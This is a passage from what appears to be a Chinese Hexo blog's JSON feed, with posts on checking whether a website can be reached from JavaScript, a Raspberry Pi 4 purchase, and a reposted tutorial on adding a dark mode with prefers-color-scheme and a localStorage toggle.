class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 10:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a 